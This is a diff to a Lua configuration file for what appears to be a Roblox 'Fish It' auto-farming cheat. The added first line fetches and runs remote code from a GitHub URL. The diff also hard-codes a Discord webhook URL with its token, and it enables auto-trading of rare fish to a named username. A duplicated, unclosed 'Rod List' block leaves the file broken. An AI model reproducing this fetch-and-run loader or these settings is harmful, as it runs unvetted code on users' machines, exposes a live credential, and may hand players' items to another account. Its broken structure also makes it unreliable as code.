@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FnDXueyi/list/refs/heads/main/game"))()
+
 _G.FishItConfig = _G.FishItConfig or {
     ["Fishing"] = {
         ["Auto Perfect"] = false,
@@ -15,20 +17,20 @@ _G.FishItConfig = _G.FishItConfig or {
         ["Auto Accept Trade"] = false,
         ["Auto Friend Request"] = false,
     },
-
+    
     ["Auto Trade"] = {
-        ["Enabled"] = true,
-        ["Whitelist Username"] = {""},
+        ["Enabled"] = true,        
+        ["Whitelist Username"] = {"FahPiiWoW"},
         ["Category Fish"] = {
            "Secret",
-       },
+       },         
         ["Fish Name"] = {
-           "Sacred Guardian Squid",
+           "Sacred Guardian Squid",           
            {Name = "Ruby", Variant = "Gemstone"},
-       },
-        ["Item Name"] = {
-           "Evolved Enchant Stone",
-       },
+       }, 
+        ["Item Name"] = {             
+           "Evolved Enchant Stone",        
+       },     
     },
     ["Selling"] = {
         ["Auto Sell"] = true,
@@ -39,7 +41,7 @@ _G.FishItConfig = _G.FishItConfig or {
         ["Auto Ghostfinn Rod"] = true,
         ["Auto Element Rod"] = false,
         ["Auto Diamond Rod"] = false,
-        ["Unlock Ancient Ruin"] = true,
+        ["Unlock Ancient Ruin"] = false,
         ["Allowed Sacrifice"] = {
                 "Ghost Shark",
                 "Giant Squid",
@@ -62,11 +64,11 @@ _G.FishItConfig = _G.FishItConfig or {
         ["Minimum Rod"] = "Astral Rod",
     },
     ["WebHook"] = {
-        ["Link Webhook"] = "",
+        ["Link Webhook"] = "https://discord.com/api/webhooks/1462415252405883055/-QhWVA_ZkKJA46o2DKWEHw7EeGS4CXq5F4hlMuXmd-14m8BrdVkejzfddx0mSmgXi5_a",
         ["Auto Sending"] = true,
         ["Category"] = {"Secret"},
 
-        ["Link Webhook Quest Complete"] = "",
+        ["Link Webhook Quest Complete"] = "https://discord.com/api/webhooks/1462415252405883055/-QhWVA_ZkKJA46o2DKWEHw7EeGS4CXq5F4hlMuXmd-14m8BrdVkejzfddx0mSmgXi5_a",
     },
     ["Weather"] = {
         ["Auto Buying"] = true,
@@ -87,14 +89,26 @@ _G.FishItConfig = _G.FishItConfig or {
     ["Bait List"] = {
         ["Auto Buying"] = true,
         ["Buy List"] = {
+            "Midnight Bait",
+            "Chroma Bait",
+            "Corrupt Bait", 
+            "Floral Bait",
             "Singularity Bait",
         },
-        ["Endgame"] = "Singularity Bait",
+        ["Endgame"] = "",
     },
+    ["Rod List"] = {
+        ["Auto Buying"] = true,
+        ["Buy List"] = {
+            "Luck Rod",
+            "Grass Rod",
+            "Midnight Rod",
+            "Astral Rod",
+        },
     ["Rod List"] = {
         ["Location Rods"] = {
             ["Fisherman Island"] = {"Starter Rod"},
-            ["Kohana Volcano"] = {"Grass Rod", "Midnight Rod"},
+            ["Kohana Volcano"] = {"Luck Rod", "Grass Rod", "Midnight Rod"},
             ["Treasure Room"] = {"Ghostfinn Rod", "Element Rod"},
         },
         ["Endgame"] = "Diamond Rod",
